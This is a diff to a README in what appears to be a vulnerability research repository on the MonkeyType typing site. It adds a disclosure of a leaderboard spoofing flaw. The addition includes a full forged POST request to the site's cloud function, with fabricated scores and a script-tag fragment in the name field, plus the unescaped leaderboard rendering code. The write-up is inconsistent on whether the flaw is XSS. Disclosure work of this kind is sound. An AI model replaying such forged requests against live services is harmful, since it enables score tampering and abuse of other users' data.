@@ -22,6 +22,7 @@ This repository contains original vulnerability research on [MonkeyType](https:/
 **Table of Contents**
 - [Identified Vulnerabilities](#identified-vulnerabilities)
   - [Stored Cross-Site Scripting (XSS) via Tribe Chat](#stored-cross-site-scripting-xss-via-tribe-chat)
+  - [Leaderboard Authenticated ByPass by Spoofing](#leaderboard-authenticated-bypass-by-spoofing)
   - [Self Cross Site Scripting (XSS) via Word History](#self-cross-site-scripting-xss-via-word-history)
 - [MonkeySee](#monkeysee)
   - [What is it?](#what-is-it)
@@ -69,6 +70,69 @@ In this example, I used an `onclick` payload to demonstrate the capability. The 
 ![](img/tribe_stored_xss_burp.png)
 
 
+## Leaderboard Authenticated ByPass by Spoofing 
+
+### Overview 
+
+Monkeytype.com is vulnerable to authenticated bypass by spoofing in the leaderboard. Users can bypass leaderboard controls and inject any object they want into the leaderboard by spoofing post requests to `/checkLeaderboards`. Malicious users can send specially crafted post requests and inject any user they want to the top of the leaderboard with any value words per minuet they want. Server does invalidate requests with cross-site scripting (XSS) payloads, therefore I believe this is not vulnerable to XSS.
+
+### Payload
+
+```yaml
+POST /checkLeaderboards HTTP/2
+Host: us-central1-monkey-type.cloudfunctions.net
+Content-Length: 750
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
+Authorization: Bearer 
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: https://monkeytype.com
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://monkeytype.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+{"data":{"uid":"aXi5udatSndUhoQR5pUtR6GpvGF3","lbMemory":{"time15":{"global":null,"daily":null},"time60":{"global":null,"daily":null}},"name":"pwnville_foo2<script>console.log","banned":null,"verified":null,"discordId":null,"result":{"wpm":200.00,"rawWpm":200.00,"correctChars":250,"incorrectChars":6,"allChars":250,"acc":92,"mode":"time","mode2":15,"quoteLength":-1,"punctuation":false,"numbers":false,"timestamp":1622147912060,"language":"english","restartCount":0,"incompleteTestSeconds":0,"difficulty":"normal","testDuration":15.001134999999515,"afkDuration":0,"blindMode":false,"theme":"9009","tags":[],"consistency":83.22,"keyConsistency":45.56,"funbox":"none","bailedOut":false,"customText":null,"uid":"aXi5udatSndUhoQR5pUtR6GpvGF3","id":"vZkPA1dmzeUvaGQPkE4Z"}}}
+```
+
+> After making the above post request, my user was added to the top of the leaderboard  
+
+
+![](img/leader.png)
+
+### Vulnerable Components 
+
+The root cause of the stored XSS vulnerability is the method for which firebase data is input into the leaderboards table. On line [126](https://github.com/Miodec/monkeytype/blob/974088926fbe42de1c7c82a1a8902a103c18b91f/src/js/elements/leaderboards.js#L126) in leaderboard.js, 
+
+
+```html
+$("#leaderboardsWrapper table.daily tbody").append(`
+          <tr>
+          <td>${
+            dindex === 0 ? '<i class="fas fa-fw fa-crown"></i>' : dindex + 1
+          }</td>
+          <td ${meClassString}>${entry.name}</td>
+          <td class="alignRight">${entry.wpm.toFixed(
+            2
+          )}<br><div class="sub">${entry.acc.toFixed(2)}%</div></td>
+          <td class="alignRight">${entry.raw.toFixed(2)}<br><div class="sub">${
+            entry.consistency === "-" ? "-" : entry.consistency.toFixed(2) + "%"
+          }</div></td>
+          <td class="alignRight">${entry.mode}<br><div class="sub">${
+            entry.mode2
+          }</div></td>
+          <td class="alignRight">${moment(entry.timestamp).format(
+            "DD MMM YYYY"
+          )}<br><div class='sub'>${moment(entry.timestamp).format(
+            "HH:mm"
+          )}</div></td>
+        </tr>
+```
 ## Self Cross Site Scripting (XSS) via Word History
 
 ![](img/self_xss2.png)
